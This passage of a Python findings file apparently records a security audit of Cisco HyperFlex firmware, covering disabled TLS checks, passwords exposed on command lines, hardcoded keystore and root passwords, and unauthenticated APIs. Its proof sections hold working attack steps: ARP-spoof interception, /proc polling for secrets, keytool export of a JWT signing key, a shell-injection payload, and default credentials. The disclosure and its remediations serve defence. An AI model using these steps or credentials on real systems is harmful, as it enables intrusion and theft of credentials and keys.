        "grep -n 'X-RootSessionID\\|verify_ssl\\|disable_warnings' "
        "/opt/hyperflex/restClientModule/swagger_api_client.py\n\n"
        "# Confirm curl -k in auth token request:\n"
        "grep '_get_auth_token\\|curl.*-k' "
        "/opt/hyperflex/restClientModule/swagger_api_client.py\n"
        "# MiTM interception during upgrade: position on management VLAN,\n"
        "# ARP-spoof between CVM nodes; capture X-RootSessionID in REST headers\n"
        "# and JWT + credentials from AAA auth request body."
    ),
    "remediation": (
        "1. Remove all 'verify_ssl = False' assignments; set 'verify_ssl = True' "
        "   (the urllib3/swagger default). Bundle the HyperFlex internal CA "
        "   certificate and set 'ssl_ca_cert' to its path in each Configuration "
        "   object.\n"
        "2. Replace 'curl ... -k' with 'curl --cacert /etc/hyperflex/secure/ca.pem' "
        "   or use the requests library with 'verify=/path/to/ca.pem'.\n"
        "3. Remove 'urllib3.disable_warnings()' — these warnings exist precisely "
        "   to flag certificate validation failures in logs.\n"
        "4. Apply the same remediation class as HX-F142: no HyperFlex internal "
        "   service should disable TLS certificate verification."
    ),
}

HX_F149 = {
    "id": "HX-F149",
    "title": (
        "TLS Certificate Verification Disabled in switchToArbitrator.py "
        "Exposes X-RootSessionID Token During Stretched Cluster Switchover"
    ),
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-stretched",
    "file": "usr/share/hyperflex/storfs-stretched/switchToArbitrator.py",
    "lines": "134",
    "description": (
        "The stretched cluster switchover script (switchToArbitrator.py) disables "
        "TLS certificate verification for all REST calls via 'verify=False' in the "
        "'restWithRetry' function (line 134): "
        "'resp = restFn(url=restUrl, data=data, auth=auth, headers=headers, verify=False)'. "
        "This applies to all calls routed through 'runRestQuery()' — every REST "
        "endpoint queried during the switchover workflow.\n\n"
        "The 'runRestQuery()' function (lines 111-115) injects 'X-RootSessionID' "
        "as a default header on every call. The ROOT_SESSION_ID is read at startup "
        "from '/etc/hyperflex/secure/root_file.pub' (line 163). With certificate "
        "verification disabled, an adjacently-positioned MiTM attacker can intercept "
        "this admin token during any stretched cluster switchover operation, gaining "
        "full admin access to all HyperFlex management APIs (see HX-F144).\n\n"
        "Same vulnerability class as HX-F142 (stCli global TLS bypass) and HX-F148 "
        "(upgrade client TLS bypass). This path is triggered during "
        "decommissioning of the Witness VM and migration to an Intersight or "
        "custom arbitrator — an infrequent but high-privilege operation."
    ),
    "proof": (
        "# Confirm verify=False in restWithRetry:\n"
        "grep -n 'verify' "
        "/usr/share/hyperflex/storfs-stretched/switchToArbitrator.py\n"
        "# Expected: line 134: verify=False in the restFn call\n\n"
        "# Confirm X-RootSessionID sent with verify=False:\n"
        "grep -n 'X-RootSessionID\\|ROOT_SESSION_ID' "
        "/usr/share/hyperflex/storfs-stretched/switchToArbitrator.py\n"
        "# MiTM during switchover: position on management VLAN,\n"
        "# ARP-spoof between CVM and target endpoint,\n"
        "# capture X-RootSessionID from the request headers."
    ),
    "remediation": (
        "1. Remove 'verify=False' from the 'restFn' call in 'restWithRetry'; "
        "   pass 'verify=/etc/hyperflex/secure/ca.pem' (the internal CA bundle) "
        "   to validate server certificates.\n"
        "2. Apply the same fix class as HX-F142 and HX-F148: no HyperFlex internal "
        "   client should disable TLS certificate verification."
    ),
}

HX_F150 = {
    "id": "HX-F150",
    "title": (
        "Arbitrator Password Exposed in switchToArbitrator.py Command-Line Argument"
    ),
    "severity": "MEDIUM",
    "cvss_score": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-214",
    "component": "storfs-stretched",
    "file": "usr/share/hyperflex/storfs-stretched/switchToArbitrator.py",
    "lines": "60-62",
    "description": (
        "The 'switchToArbitrator.py' script accepts the Intersight or custom "
        "arbitrator password via the '--arbitrator-password' command-line option "
        "(line 61: 'p.add_option(\"--arbitrator-password\", dest=\"password\", ...)'). "
        "When invoked with this flag, the plaintext password is visible in the "
        "process table to any local user via 'ps aux' or '/proc/<pid>/cmdline' "
        "for the lifetime of the Python interpreter invocation.\n\n"
        "The script also accepts a non-interactive path via '--force' combined "
        "with '--arbitrator-username' and '--arbitrator-password' (lines 353-354: "
        "'hxsvcclient.switchToAuxZk(aux_ip, site, arb_ip, username, password)'), "
        "which is the automation/scripting invocation path — the path most likely "
        "to have the password supplied as a cmdline argument rather than "
        "interactively via 'getpass'. In the interactive path, the password is "
        "correctly read via 'getpass()' (lines 392, 409, 417) and not exposed.\n\n"
        "Same vulnerability class as HX-F143 (factory_deploy.py ESX password) "
        "and HX-F147 (changepasswd.sh old/new password)."
    ),
    "proof": (
        "# Observe password in process table during non-interactive switchover:\n"
        "# Terminal 1 — trigger switchover with --force:\n"
        "# python3 switchToArbitrator.py --force --arbitrator-ip <IP> \\\n"
        "#   --arbitrator-username admin --arbitrator-password MyS3cret ...\n"
        "# Terminal 2 — observe before process exits:\n"
        "ps auxww | grep switchToArbitrator | grep -v grep\n"
        "# Expected output includes '--arbitrator-password MyS3cret'\n\n"
        "# Also readable from procfs:\n"
        "cat /proc/<pid>/cmdline | tr '\\0' ' '"
    ),
    "remediation": (
        "1. Remove '--arbitrator-password' command-line option. For scripted/automated "
        "   invocations, supply the password via a securely-permissioned environment "
        "   variable or a credentials file with mode 0600.\n"
        "2. For interactive use, the 'getpass()' path already handles password "
        "   input correctly — retain that and remove the CLI option.\n"
        "3. Apply the same fix class as HX-F143 and HX-F147: never accept "
        "   secrets as positional or named command-line arguments."
    ),
}

HX_F151 = {
    "id": "HX-F151",
    "title": (
        "Global Python SSL Context Monkey-Patched to Unverified in config-ctlvm.py, "
        "Disabling TLS Certificate Validation for All vSphere SDK Connections"
    ),
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-appliance",
    "file": "usr/share/hyperflex/storfs-appliance/config-ctlvm.py",
    "lines": "533-534",
    "description": (
        "The appliance controller VM configuration script (config-ctlvm.py) "
        "monkey-patches the global Python SSL context in its main() function "
        "before any connection is established (lines 533-534):\n\n"
        "'ssl._create_default_https_context = ssl._create_unverified_context'\n\n"
        "Unlike request-level 'verify=False' flags (HX-F142, HX-F148, HX-F149), "
        "this technique replaces the default SSL context factory for the entire "
        "Python process. Every SSL connection subsequently made by ANY library in "
        "the process — including pyVmomi's 'connect.Connect()' at line 504, "
        "urllib, httplib, and any vSphere SDK operation — will use an unverified "
        "context with no server certificate validation.\n\n"
        "The script connects to the ESX host via pyVmomi: "
        "'connect.Connect(host=args.host, user=args.user, pwd=args.password)' "
        "(line 504). With the global SSL context replaced, this vSphere SDK "
        "connection sends the ESX root password and the resulting vSphere session "
        "token over TLS without verifying the server's certificate. An "
        "adjacently-positioned MiTM attacker can present a self-signed certificate "
        "and capture both the ESX root credentials and the vSphere session, "
        "gaining full ESX hypervisor access.\n\n"
        "The script is invoked by storfs-appliance scripts during USB NIC "
        "configuration and extra-config operations, which run as root."
    ),
    "proof": (
        "# Confirm global SSL monkey-patch:\n"
        "grep -n 'ssl._create_default_https_context\\|_create_unverified_context' "
        "/usr/share/hyperflex/storfs-appliance/config-ctlvm.py\n"
        "# Expected: lines 533-534 in main() before any connection is made\n\n"
        "# Confirm pyVmomi vSphere connection with no cert validation:\n"
        "python3 -c \"\n"
        "import ssl\n"
        "ssl._create_default_https_context = ssl._create_unverified_context\n"
        "from pyVim import connect\n"
        "# connect.Connect() will now bypass cert validation:\n"
        "si = connect.Connect(host='<esxi_ip>', user='root', pwd='<password>')\n"
        "print('Connected without cert validation:', si)\""
    ),
    "remediation": (
        "1. Remove lines 533-534 entirely. Python's default SSL context already "
        "   validates certificates.\n"
        "2. For self-signed ESX certificates, create a custom SSLContext with "
        "   'context.verify_mode = ssl.CERT_REQUIRED' and load the ESX server "
        "   certificate into the trust store: "
        "'context.load_verify_locations(/etc/hyperflex/secure/esxi_cert.pem)'.\n"
        "3. Apply the same remediation class as HX-F142, HX-F148, HX-F149: "
        "   no HyperFlex component should globally or per-connection disable "
        "   TLS certificate verification."
    ),
}

HX_F152 = {
    "id": "HX-F152",
    "title": (
        "ESX Root Password Exposed in config-ctlvm.py Command-Line Argument"
    ),
    "severity": "MEDIUM",
    "cvss_score": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-214",
    "component": "storfs-appliance",
    "file": "usr/share/hyperflex/storfs-appliance/config-ctlvm.py",
    "lines": "427-429",
    "description": (
        "The appliance controller VM configuration script (config-ctlvm.py) "
        "accepts the ESX host root password via the '-p'/'--password' command-line "
        "option (lines 427-429: 'parser.add_argument(\"-p\", \"--password\", ...)'). "
        "When the script is invoked with '-p <password>', the plaintext ESX root "
        "password is visible in the process table to any local user via 'ps aux' "
        "or '/proc/<pid>/cmdline' for the lifetime of the Python interpreter.\n\n"
        "The password is used at line 506 to authenticate to the ESX host via "
        "the pyVmomi SDK: 'connect.Connect(host=args.host, user=args.user, "
        "pwd=args.password)'. Combined with HX-F151 (global SSL bypass), the "
        "ESX root password is both visible locally via the process table AND "
        "exposed to network interception during the TLS-unverified vSphere "
        "SDK connection.\n\n"
        "Same vulnerability class as HX-F143 (factory_deploy.py), HX-F147 "
        "(changepasswd.sh), and HX-F150 (switchToArbitrator.py)."
    ),
    "proof": (
        "# Observe ESX password in process table during config-ctlvm.py invocation:\n"
        "while true; do\n"
        "  ps auxww | grep config-ctlvm | grep -v grep\n"
        "done\n"
        "# Expected output:\n"
        "# root <pid> ... python3 config-ctlvm.py -e -p RootP@ssw0rd -u root -H <host>\n\n"
        "# Confirm -p/--password option definition:\n"
        "grep -n 'password' /usr/share/hyperflex/storfs-appliance/config-ctlvm.py | head -5"
    ),
    "remediation": (
        "1. Remove '-p'/'--password' command-line option. Supply the ESX password "
        "   via stdin (read -rs ESX_PASS) or a securely-permissioned credentials "
        "   file (mode 0600).\n"
        "2. The stored-credentials path (lines 491-492) reads the password from "
        "   a config file via 'get_host_info()' — this avoids cmdline exposure "
        "   and is the correct model. Remove the option to override via cmdline "
        "   and always use the stored-credentials path.\n"
        "3. Apply the same fix class as HX-F143, HX-F147, HX-F150."
    ),
}

HX_F153 = {
    "id": "HX-F153",
    "title": (
        "SED Drive Key Encryption Key (KEK) Exposed in sedutil-cli "
        "Command-Line Arguments via sed-client.sh"
    ),
    "severity": "HIGH",
    "cvss_score": 7.0,
    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-214",
    "component": "storfs-appliance",
    "file": "usr/share/hyperflex/storfs-appliance/sed-client.sh",
    "lines": "535, 630, 696",
    "description": (
        "The SED (Self-Encrypting Drive) client script (sed-client.sh) passes "
        "the drive Key Encryption Key (KEK) as a positional command-line argument "
        "to the sedutil-cli binary in at least three functions:\n\n"
        "- sed_enable_security() line 535: "
        "'sedutil --enable-band 0 \"$KEK\" \"$DISK\"'\n"
        "- sed_secure_erase() line 630: "
        "'sedutil --erase-band 0 \"$KEK\" \"$DISK\"'\n"
        "- sed_lock_disk() line 696: "
        "'sedutil --lock-band 0 \"$KEK\" \"$DISK\"'\n\n"
        "The wrapper function 'sedutil()' at line 223 executes the binary via "
        "'$SEDUTIL $ARGS' — the entire argument list including the KEK is "
        "passed directly to the process and visible in '/proc/<pid>/cmdline' "
        "for the duration of the sedutil-cli invocation.\n\n"
        "The KEK is the authentication key for all TCG OPAL SED drives in the "
        "HyperFlex cluster. An attacker with local access who can read "
        "'/proc/<pid>/cmdline' during a sed_enable_security, sed_secure_erase, "
        "or sed_lock_disk operation captures the KEK for all cluster drives. "
        "With the KEK and subsequent physical or logical drive access, the "
        "attacker can: (1) unlock SED bands and read all encrypted drive data; "
        "(2) erase drives (sed_secure_erase); (3) re-key drives, denying the "
        "cluster access to its own encrypted data.\n\n"
        "The sedsvc Go service (HX-F141) retrieves the KEK from ZooKeeper and "
        "delivers it to the encryption WAR. This finding documents the propagation "
        "of that KEK to disk via cmdline args in the shell layer."
    ),
    "proof": (
        "# During a disk encryption enable or rekey operation, observe the KEK:\n"
        "while true; do\n"
        "  for pid in $(pgrep sedutil-cli); do\n"
        "    cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' '\n"
        "  done\n"
        "done\n"
        "# Expected: 'sedutil-cli --enable-band 0 <kek_value> /dev/sdX'\n\n"
        "# Confirm KEK as cmdline arg in sed-client.sh:\n"
        "grep -n '\"\\$KEK\"' /usr/share/hyperflex/storfs-appliance/sed-client.sh\n"
        "# Expected: lines 535, 630, 696 (enable-band, erase-band, lock-band)"
    ),
    "remediation": (
        "1. sedutil-cli should accept the KEK via stdin rather than cmdline args. "
        "   Pass via heredoc or process substitution: "
        "'echo \"$KEK\" | sedutil --enable-band-stdin 0 \"$DISK\"' "
        "   (requires sedutil-cli modification or use of a wrapper that accepts "
        "   the key via stdin and passes it to the binary's expected protocol).\n"
        "2. If the sedutil-cli binary cannot be modified, create a wrapper binary "
        "   that accepts the key via stdin or a named pipe (mode 0600) and "
        "   internally passes it to sedutil using an environment variable or "
        "   an OS-level mechanism that does not appear in the process table.\n"
        "3. Ensure all KEK-using functions in sed-client.sh are updated "
        "   consistently — sed_enable_security, sed_disable_security, "
        "   sed_secure_erase, sed_lock_disk, and rekey_bandmaster all pass "
        "   the KEK as an argument and require the same fix."
    ),
}

HX_F154 = {
    "id": "HX-F154",
    "title": (
        "Hardcoded Java KeyStore Password 'springpath' in "
        "hyperflex_security.properties — Universal Across All HyperFlex Deployments"
    ),
    "severity": "CRITICAL",
    "cvss_score": 8.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-798",
    "component": "storfs-misc",
    "file": "usr/share/hyperflex/storfs-misc/hyperflex_security.properties",
    "lines": "5",
    "description": (
        "The HyperFlex security properties file (hyperflex_security.properties) "
        "contains a base64-encoded Java KeyStore password hardcoded in the "
        "firmware image:\n\n"
        "'<entry key=\"keystore_password\">c3ByaW5ncGF0aA==</entry>'\n\n"
        "Decoded: 'c3ByaW5ncGF0aA==' → 'springpath' (the original company name "
        "before the Cisco acquisition). Because this value is in the firmware "
        "package (storfs-misc deb), it is identical across every HyperFlex "
        "deployment — no per-installation generation or rotation.\n\n"
        "The keystore password protects 'hyperflex_keystore.jceks', the Java "
        "KeyStore containing:\n"
        "1. The TLS private key and certificate for internal REST API services\n"
        "2. The AES secret key used for JWT token signing and verification "
        "   (HyperFlex uses a symmetric HMAC key in the keystore to sign JWT "
        "   tokens issued by the AAA service)\n"
        "3. Trust anchors for inter-service TLS\n\n"
        "An attacker who can read '/etc/hyperflex/secure/hyperflex_keystore.jceks' "
        "(accessible via HX-F144's world-readable root_file.pub to authenticate, "
        "or via any other authenticated path) can open the keystore with password "
        "'springpath' and extract:\n"
        "- The JWT signing key → forge arbitrary admin JWT tokens valid indefinitely\n"
        "- The TLS private key → perform TLS MiTM for internal REST services\n\n"
        "The migrate-secureconfig.sh script moves the properties file to "
        "'/etc/hyperflex/secure/' but preserves file permissions and does not "
        "rotate the keystore password."
    ),
    "proof": (
        "# Decode the hardcoded keystore password:\n"
        "python3 -c \"import base64; print(base64.b64decode('c3ByaW5ncGF0aA==').decode())\"\n"
        "# Output: springpath\n\n"
        "# Verify in deployed system:\n"
        "grep keystore_password /etc/hyperflex/secure/hyperflex_security.properties\n"
        "# Expected: <entry key=\"keystore_password\">c3ByaW5ncGF0aA==</entry>\n\n"
        "# Extract keystore contents with keytool using the known password:\n"
        "keytool -list -keystore /etc/hyperflex/secure/hyperflex_keystore.jceks "
        "-storetype jceks -storepass springpath\n"
        "# Lists all key entries including JWT signing key and TLS private keys\n\n"
        "# Extract JWT signing key to forge tokens:\n"
        "keytool -exportcert -keystore /etc/hyperflex/secure/hyperflex_keystore.jceks "
        "-storetype jceks -storepass springpath -alias hxjwtkey -file jwt.key"
    ),
    "remediation": (
        "1. Generate a unique keystore password per deployment during cluster "
        "   initialization (e.g., 'python3 -c \"import secrets; "
        "   print(secrets.token_hex(32))\"') and write it to the properties "
        "   file during first boot — never ship a hardcoded default.\n"
        "2. Store the per-deployment keystore password in a location that is not "
        "   world-readable: mode 0600, owned by the HyperFlex service account.\n"
        "3. Rotate the keystore password and regenerate the keystore on any "
        "   suspected compromise.\n"
        "4. As an immediate mitigation: change the keystore password on all "
        "   deployed systems from 'springpath' to a randomly-generated value "
        "   using 'keytool -storepasswd -keystore hyperflex_keystore.jceks'."
    ),
}

HX_F155 = {
    "id": "HX-F155",
    "title": (
        "Unauthenticated Exhibitor ZooKeeper REST API on Port 8180 "
        "Exposes Cluster Configuration and ZooKeeper Node Data"
    ),
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-306",
    "component": "storfs-misc / storfs-deploy",
    "file": (
        "usr/share/hyperflex/storfs-misc/hx-scripts/node_replace.py, "
        "opt/hyperflex/storfs-deploy/ansible/library/exhibitorCfg.py"
    ),
    "lines": "413, 425, 442 (node_replace.py); 27 (exhibitorCfg.py)",
    "description": (
        "The HyperFlex Exhibitor ZooKeeper manager REST API at port 8180 is "
        "accessed without authentication by multiple management scripts. "
        "Exhibitor (Netflix/Sonatype) provides a REST API for ZooKeeper "
        "configuration and node browsing; HyperFlex uses it without enabling "
        "Exhibitor's authentication mechanisms.\n\n"
        "node_replace.py (lines 413, 425, 442) makes unauthenticated HTTP GET "
        "requests to Exhibitor:\n"
        "  requests.get('http://localhost:8180/exhibitor/v1/explorer/node"
        "?key=%2Fcluster%2Fpnodes')\n"
        "  requests.get('http://localhost:8180/exhibitor/v1/explorer/node"
        "?key=%2Fcluster%2Fmembers')\n"
        "  requests.get('http://localhost:8180/exhibitor/v1/config/get-state')\n\n"
        "exhibitorCfg.py (line 27) connects to remote cluster nodes' Exhibitor "
        "APIs using the node IP from stMgr.cfg — not just localhost:\n"
        "  requests.get('http://' + serverIp + ':8180/exhibitor/v1/config/"
        "get-state')\n\n"
        "The iptables rules in zkchangehandler.sh and add-witness-iptable-rules.sh "
        "DNAT port 8180 from eth0 to eth1: 'iptables -t nat -A PREROUTING -p tcp "
        "-d $ETH0 --dport 8180 -j DNAT --to-dest $ETH1'. This exposes the "
        "Exhibitor API on the CVM management interface during witness/arbitrator "
        "configuration changes.\n\n"
        "Exploitable capabilities via unauthenticated Exhibitor REST API:\n"
        "- GET /exhibitor/v1/explorer/node?key=<path>: read any ZooKeeper node "
        "  including cluster membership, encryption configuration paths, and "
        "  any keys stored in ZK\n"
        "- GET /exhibitor/v1/config/get-state: read Exhibitor/ZK config\n"
        "- POST /exhibitor/v1/config/set: modify ZooKeeper cluster configuration "
        "  (if write API is unauthenticated)\n\n"
        "Same vulnerability class as HX-F141 (sedsvc unauthenticated on port "
        "8012); different exposure: cluster configuration vs. drive erasure."
    ),
    "proof": (
        "# From the CVM or from the data network after DNAT rules are active:\n"
        "# Read ZooKeeper node data (cluster membership):\n"
        "curl -s 'http://localhost:8180/exhibitor/v1/explorer/node"
        "?key=%2Fcluster%2Fmembers'\n"
        "# Read Exhibitor/ZK cluster configuration:\n"
        "curl -s 'http://localhost:8180/exhibitor/v1/config/get-state' | python3 -m json.tool\n"
        "# Test write capability:\n"
        "curl -s -X POST 'http://localhost:8180/exhibitor/v1/explorer/node-data' \\\n"
        "  -H 'Content-Type: application/json' \\\n"
        "  -d '{\"key\":\"/test\",\"value\":\"test\",\"isNew\":true}'"
    ),
    "remediation": (
        "1. Enable Exhibitor's built-in security provider: set "
        "'--security-provider-classname' to a provider that requires auth, "
        "or configure 'BasicAuthSecurityProvider' with a strong password.\n"
        "2. Bind Exhibitor to localhost only (127.0.0.1:8180) — do not allow "
        "cross-node access to the Exhibitor HTTP API; use ZooKeeper's native "
        "SASL/DIGEST authentication for cluster coordination instead.\n"
        "3. Remove the iptables DNAT rules for port 8180 from management "
        "   interface to data interface — Exhibitor should not be externally "
        "   reachable.\n"
        "4. Restrict Exhibitor to read-only endpoints, or replace the write "
        "   paths with authenticated admin-only API calls."
    ),
}

HX_F156 = {
    "id": "HX-F156",
    "title": (
        "Systemic TLS Certificate Verification Bypass Across "
        "HyperFlex Management Scripts in storfs-misc"
    ),
    "severity": "HIGH",
    "cvss_score": 7.4,
    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-misc",
    "file": (
        "usr/share/hyperflex/storfs-misc/hx-scripts/add_vswitch.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/esx_util.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/iscsiVolumeAccessCheck.py, "
        "usr/share/hyperflex/storfs-misc/pci_passthru.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/install_vc_plugin.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/check_vswitch.py, "
        "usr/share/hyperflex/storfs-misc/hx-scripts/node_replace.py"
    ),
    "lines": "multiple per file",
    "description": (
        "TLS certificate verification is disabled systemically across the entire "
        "management script layer in the storfs-misc package. This is not an "
        "isolated oversight — it is a repeated architectural pattern across at "
        "least 7 scripts that collectively cover vSwitch configuration, ESX "
        "connectivity checks, iSCSI volume access, PCI passthrough, vCenter "
        "plugin installation, node replacement, and HX REST API access.\n\n"
        "Techniques used across the affected scripts:\n\n"
        "1. Global SSL context monkey-patch (3 scripts): "
        "'ssl._create_default_https_context = ssl._create_unverified_context' — "
        "disables cert validation for ALL SSL connections in the process\n"
        "  - add_vswitch.py lines 15, 21\n"
        "  - esx_util.py lines 41, 47\n"
        "  - iscsiVolumeAccessCheck.py lines 36, 42\n\n"
        "2. Per-request verify=False (4 scripts): "
        "'requests.get/post(..., verify=False)' — disables cert validation for "
        "specific requests\n"
        "  - check_vswitch.py lines 397, 510, 522, 532, 547 "
        "(sends 'admin' credentials with verify=False)\n"
        "  - install_vc_plugin.py line 386 "
        "(sends 'admin' credentials with verify=False)\n"
        "  - esx_util.py line 247 (sends 'admin' credentials with verify=False)\n"
        "  - node_replace.py lines 182, 193, 256, 296, 314 "
        "(sends 'root' credentials with verify=False)\n\n"
        "3. urllib3 warning suppression (3 scripts): "
        "'requests.packages.urllib3.disable_warnings()' — hides SSL errors in logs\n"
        "  - esx_util.py line 27\n"
        "  - install_vc_plugin.py line 26\n"
        "  - check_vswitch.py line 29\n\n"
        "Combined: admin and root credentials for ESX, vCenter, and HyperFlex "
        "REST APIs are transmitted over TLS without certificate verification in "
        "every management operation covered by these scripts. An adjacently-"
        "positioned MiTM attacker on the management or data network can present "
        "a self-signed certificate and capture ESX root passwords, vCenter admin "
        "credentials, and HyperFlex API tokens during any of these operations.\n\n"
        "This finding documents the systemic scope of the same vulnerability "
        "class already documented in HX-F142 (stCli), HX-F148 (upgrade client), "
        "HX-F149 (switchToArbitrator), and HX-F151 (config-ctlvm). Every layer "
        "of the management stack disables TLS verification."
    ),
    "proof": (
        "# Confirm systemic verify=False pattern across management scripts:\n"
        "grep -rn 'verify=False\\|_create_unverified\\|disable_warnings' "
        "/usr/share/hyperflex/storfs-misc/hx-scripts/ "
        "/usr/share/hyperflex/storfs-misc/pci_passthru.py\n"
        "# Expected: hits in add_vswitch.py, esx_util.py, iscsiVolumeAccessCheck.py,\n"
        "# pci_passthru.py, install_vc_plugin.py, check_vswitch.py, node_replace.py\n\n"
        "# Confirm admin credentials sent with verify=False:\n"
        "grep -n 'verify=False' /usr/share/hyperflex/storfs-misc/hx-scripts/check_vswitch.py\n"
        "# Expected: auth=('admin', password), verify=False at multiple call sites"
    ),
    "remediation": (
        "1. Establish an internal CA trust chain: bundle the HyperFlex internal "
        "   CA certificate in the storfs-misc package and pass "
        "'verify=/etc/hyperflex/secure/ca.pem' to all requests calls.\n"
        "2. Remove all 'ssl._create_default_https_context = "
        "   ssl._create_unverified_context' monkey-patches. Python's default "
        "   SSL context validates certificates.\n"
        "3. Remove all 'urllib3.disable_warnings()' calls — SSL warnings exist "
        "   to surface certificate errors for investigation.\n"
        "4. Implement a shared utility function for authenticated HTTPS requests "
        "   with proper certificate validation, and replace all verify=False "
        "   instances with calls to this utility.\n"
        "5. Apply the same fix class to HX-F142, HX-F148, HX-F149, HX-F151 — "
        "   this is a systemic architectural issue requiring a systemic fix, not "
        "   per-file patches."
    ),
}

HX_F157 = {
    "id": "HX-F157",
    "title": "SSH Host Key Validation Bypass via paramiko.AutoAddPolicy() in STIG Enforcement Scripts",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "stig_security_settings.py, stig_security_settings_hx.py, post_install.py",
    "description": (
        "Three scripts use paramiko.AutoAddPolicy() for SSH connections, silently accepting any "
        "host key without verification. The affected scripts are the STIG compliance enforcement "
        "tools — the very components responsible for applying security hardening across cluster nodes. "
        "An attacker with a position between the controller VM and an ESXi host can intercept the "
        "SSH session used to apply STIG settings, exfiltrate root credentials, and suppress or "
        "forge the compliance commands. The same pattern appears in checkSSHLogin() and sshToHost() "
        "in stig_security_settings.py (lines 364, 382), stig_security_settings_hx.py (lines 476, "
        "494), and post_install.py (line 712)."
    ),
    "evidence": [
        "stig_security_settings.py:364: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "stig_security_settings.py:382: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "stig_security_settings.py:383: ssh.connect(host, username=username, password=password)",
        "stig_security_settings.py:406: sshToHost(host, 'root', password, cmd)  # applies PAM changes",
        "stig_security_settings_hx.py:476: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "stig_security_settings_hx.py:494: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "post_install.py:712: ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())",
        "stig_security_settings.py:32: ssl._create_default_https_context = _create_unverified_https_context  # co-present",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace AutoAddPolicy() with RejectPolicy() or WarningPolicy(). Load known host keys from "
        "a pre-seeded known_hosts file before connecting. The STIG scripts should themselves be held "
        "to STIG SSH host-key requirements."
    ),
    "tags": ["ssh", "mitm", "stig", "paramiko", "host-key", "cwe-295"],
}

HX_F158 = {
    "id": "HX-F158",
    "title": "OS Command Injection via vCenter Password in Shell Command String (reRegisterClusterToVC.py)",
    "severity": "HIGH",
    "cvss": 7.8,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-78",
    "component": "storfs-misc/hx-scripts/reRegisterClusterToVC.py",
    "description": (
        "reRegisterClusterToVC.py constructs a shell command by string-formatting the vCenter "
        "password directly into the cmdStr variable (line 44) and executes it with Popen(shell=True) "
        "(line 54). A password containing shell metacharacters (semicolons, backticks, $(...)) "
        "yields arbitrary command execution as the process owner. The silent-mode code path "
        "(reRegisterToVcSilentMode, line 107) decodes the password from base64 before injection "
        "(line 111), enabling a caller to supply a crafted base64 string that decodes to a shell "
        "payload. This is also CWE-214: the vCenter password appears verbatim in /proc/<pid>/cmdline "
        "throughout the stcli subprocess lifetime."
    ),
    "evidence": [
        "reRegisterClusterToVC.py:39-44: cmdStr = \"priv stcli cluster reregister ... --vcenter-password '{}' \".format(..., vCenterUserPass)",
        "reRegisterClusterToVC.py:54: proc = Popen(cmd, shell=True, stderr=PIPE, stdout=PIPE)",
        "reRegisterClusterToVC.py:111: vc_pass = base64.b64decode(vc_pass).decode('utf-8')  # decoded before shell injection",
        "reRegisterClusterToVC.py:44: password embedded unescaped in single-quoted shell argument",
        "Example payload: password = \"x'; id > /tmp/pwned; echo '\" -> executes id",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Pass command arguments as a list to Popen with shell=False: "
        "['priv', 'stcli', 'cluster', 'reregister', '--vcenter-password', vCenterUserPass]. "
        "Never interpolate credentials into shell command strings. Remove shell=True."
    ),
    "tags": ["command-injection", "shell", "vcenter", "password", "cwe-78", "cwe-214"],
}

HX_F159 = {
    "id": "HX-F159",
    "title": "AES Encryption Key Derived from Static Firmware File; Default stctl VM Password Recoverable (Cisco123)",
    "severity": "CRITICAL",
    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-321",
    "component": "storfs-misc: springpath_env_parse.py, springpath_default.tunes, Secret.class",
    "description": (
        "springpath_env_parse.py derives the AES-256-CBC key for credential decryption from the MD5 "
        "hash of Secret.class, a static Java bytecode file shipped in every HyperFlex firmware image. "
        "Because Secret.class is public, its MD5 is a fixed constant per firmware version "
        "(1f6d13bcd7753f2d3b2e2da361b7afb5 for HXDP 6.0.2b). springpath_default.tunes stores "
        "three encrypted credentials encrypted with this key: stctl_vm_passwd, installer_passwd, "
        "and ssl_cert_passwd. Decryption of the firmware-resident ciphertext yields: "
        "stctl_vm_passwd = 'Cisco123' (storage controller VM root password), "
        "installer_passwd = 'Cisco123' (same), ssl_cert_passwd = 'springpath' (consistent with "
        "HX-F154 hardcoded keystore password). Any deployment that has not explicitly rotated "
        "these defaults retains root SSH access via 'Cisco123'. The AES key does not vary "
        "per deployment — it is fixed by the firmware image content."
    ),
    "evidence": [
